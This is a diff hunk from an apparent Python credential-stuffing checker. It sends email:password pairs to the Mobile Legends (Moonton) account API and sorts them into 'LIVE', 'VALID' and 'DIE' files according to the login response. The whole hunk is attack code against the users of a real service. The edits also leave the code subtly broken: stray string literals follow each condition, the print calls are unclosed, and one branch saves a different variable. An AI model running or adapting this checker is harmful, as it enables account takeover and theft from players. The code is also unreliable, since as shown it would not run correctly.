@@ -42,16 +42,16 @@ def doCheck(empass, delim = None):
         wibuPost['sign'] = hashlib.md5(str(wibuSort).encode('utf-8')).hexdigest()
         getData = requests.post('https://accountmtapi.mobilelegends.com/', data=json.dumps(wibuPost), headers={'User-Agent': UserAgent().random})
         wibuJson = json.loads(getData.text)
-        if wibuJson['message'] == 'Error_Success':
+        if wibuJson['message'] == 'Error_Success': " "
             print(colored('LIVE!', 'green') + " " + empass + 
             doSave('MOONTON_LIVE.txt', empass)
-        elif wibuJson['message'] == 'Error_PasswdError':
+        elif wibuJson['message'] == 'Error_PasswdError': " "
             print(colored('VALID!', 'blue') + " " + empass + 
             doSave('MOONTON_VALID.txt', email)
-        elif wibuJson['message'] == 'Error_NoAccount':
+        elif wibuJson['message'] == 'Error_NoAccount': " "
             print(colored('DIE!', 'red') + " " + empass + 
             doSave('MOONTON_DIE.txt', empass)
-        elif wibuJson['message'] == 'Error_SignConflict':
+        elif wibuJson['message'] == 'Error_SignConflict': " "
             print(colored('ERROR!', 'red') + " " + empass + 
             doSave('MOONTON_DIE.txt', empass)
     except Exception as e:
